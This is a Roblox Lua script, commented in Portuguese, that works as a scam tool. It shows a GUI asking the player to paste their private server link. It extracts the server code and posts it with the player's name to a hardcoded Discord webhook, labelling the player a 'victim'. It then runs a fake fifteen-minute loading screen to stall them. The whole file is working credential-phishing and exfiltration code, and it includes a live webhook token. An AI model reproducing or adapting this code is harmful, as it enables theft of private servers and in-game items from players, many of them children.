-- ================== CONFIG ==================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1462117939783143518/WSTNnkQ5xQyd-oJAj3SJ6kOOFAE8E2yNlSeyhUefATtz9f9_swVD47FAC3V-O5NKhAlL"
local LOADING_TIME = 15 * 60 -- 15 minutos

-- ================== SERVICES =================
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- ================== FUNÇÕES ==================

-- Extrai o privateServerLinkCode do link
local function getServerLinkCode(link)
    if not link then return nil end
    return string.match(link, "privateServerLinkCode=([^&]+)")
end

-- Envia o código para o Discord
local function sendToWebhook(code)
    local data = {
        content =
        "**VITIMA DETECTADA!!!!!!!!!!**\n"..
        "VICTIM NICK: "..player.Name.."\n"..
        "SERVER LINK  `" .. code .. "`"
    }

    local json = HttpService:JSONEncode(data)

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = json
    })
end

-- ================== GUI PRINCIPAL ==================
local gui = Instance.new("ScreenGui")
gui.Name = "ServerLinkGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.4, 0.35)
frame.Position = UDim2.fromScale(0.3, 0.325)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.fromScale(1, 0.22)
title.Position = UDim2.fromScale(0, 0)
title.BackgroundTransparency = 1
title.Text = "COLOQUE SEU SERVER PV AQUI!"
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.TextColor3 = Color3.fromRGB(0,0,0)

local box = Instance.new("TextBox", frame)
box.Size = UDim2.fromScale(0.9, 0.22)
box.Position = UDim2.fromScale(0.05, 0.3)
box.PlaceholderText = "Cole o link do servidor privado do Roblox"
box.Text = ""
box.TextScaled = true
box.Font = Enum.Font.SourceSans
box.BackgroundColor3 = Color3.fromRGB(240,240,240)
box.TextColor3 = Color3.fromRGB(0,0,0)
box.ClearTextOnFocus = false
Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)

local button = Instance.new("TextButton", frame)
button.Size = UDim2.fromScale(0.5, 0.18)
button.Position = UDim2.fromScale(0.25, 0.62)
button.Text = "ENVIAR"
button.TextScaled = true
button.Font = Enum.Font.SourceSansBold
button.BackgroundColor3 = Color3.fromRGB(0,0,0)
button.TextColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", button).CornerRadius = UDim.new(0,8)

-- ================== LOADING SCREEN ==================
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGUI"
loadingGui.Enabled = false
loadingGui.ResetOnSpawn = false
loadingGui.Parent = player.PlayerGui

local bg = Instance.new("Frame", loadingGui)
bg.Size = UDim2.fromScale(1,1)
bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
bg.BorderSizePixel = 0

local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.fromScale(0.5, 0.05)
barBg.Position = UDim2.fromScale(0.25, 0.7)
barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
barBg.BorderSizePixel = 0
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,6)

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.fromScale(0,1)
bar.BackgroundColor3 = Color3.fromRGB(255,255,255)
bar.BorderSizePixel = 0
Instance.new("UICorner", bar).CornerRadius = UDim.new(0,6)

-- ================== BOTÃO ==================
button.MouseButton1Click:Connect(function()
    local link = box.Text

    -- valida se é link Roblox
    if not link or not string.find(link, "roblox.com") then
        button.Text = "LINK INVÁLIDO"
        task.wait(2)
        button.Text = "ENVIAR"
        return
    end

    -- extrai o código
    local code = getServerLinkCode(link)
    if not code then
        button.Text = "SEM SERVER CODE"
        task.wait(2)
        button.Text = "ENVIAR"
        return
    end

    -- envia para webhook
    sendToWebhook(code)

    -- mostra loading
    frame.Visible = false
    loadingGui.Enabled = true

    local start = tick()
    while tick() - start < LOADING_TIME do
        local progress = (tick() - start) / LOADING_TIME
        bar.Size = UDim2.fromScale(math.clamp(progress, 0, 1), 1)
        task.wait(1)
    end

    bar.Size = UDim2.fromScale(1,1)
end)
